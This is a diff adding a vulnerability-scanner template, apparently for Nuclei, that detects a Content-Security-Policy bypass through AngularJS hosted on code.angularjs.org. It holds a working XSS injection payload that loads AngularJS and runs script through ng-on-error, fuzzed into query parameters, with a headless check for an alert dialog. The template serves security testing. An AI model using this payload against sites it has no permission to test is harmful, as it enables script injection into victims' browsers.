@@ -1,0 +1,55 @@
+id: angularjs-code-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - AngularJS Code
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,angularjs-code
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "angularjs.org"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: angularjs_code_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "angularjs_code_csp_xss == true"
+# digest: 4a0a00473045022100f71008e67eeaa6f86966ee34f89e3a384a576b369bf705c1a2ab47e6ee465e96022074876b521ae61f16a15c4a6cf5c3134ef22451c5ee35f263e9096a89d3900288:922c64590222798bb761d5b6d8e72950
